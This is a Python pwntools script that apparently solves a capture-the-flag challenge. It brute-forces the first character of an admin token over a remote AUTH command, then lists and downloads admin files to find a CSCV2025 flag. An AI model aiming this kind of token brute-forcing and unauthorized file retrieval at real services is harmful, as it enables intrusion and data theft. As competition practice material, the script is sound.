#!/usr/bin/env python3
from pwn import *

exe = ELF('chall', checksec=False)
# libc = ELF('', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'amd64'
context.endian = 'little'

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)
ra     = lambda proc=None: proc.recvall(timeout=1) if proc else p.recvall(timeout=1)

def GDB():
    gdb.attach(p, gdbscript="""
        
        
    """)

if args.REMOTE:
    p = remote("35.197.152.52", int("1337"))
else:
    qemu_bin = None
    if qemu_bin:
        p = process([qemu_bin] + qemu_args + [exe.path]) # type: ignore
    else:
        p = process([exe.path])
    if args.GDB:
        GDB()

# Gud luk pwner !
chars = '0123456789abcdef'

for char in chars:
        print(f"[*] Trying admin token starting with: {char}")
        
        sl(f'AUTH admin {char}')
        
        if b'OK' in rl():
            print(f"\n[!] SUCCESS! Admin token starts with: {char}")
            print("[+] Authenticated as admin!")
            
            print("\n[*] Listing admin files...")
            sl('LIST')
            rl()
            flag = rl().decode()
            print(f"[+] Files:\n{flag}")
            
            print(f"\n[*] Downloading: {flag}")
            sl(f'DOWNLOAD {flag}')
            content = rl().decode()
            
            if content and len(content) > 5:
                print(f"[+] Content of {flag}:")
                print("="*60)
                print(content)
                print("="*60)
                
                if 'CSCV2025{' in content:
                    print(f"\nðŸš© FLAG FOUND in {flag}!")
                    print(content)
                    break
            
p.interactive()
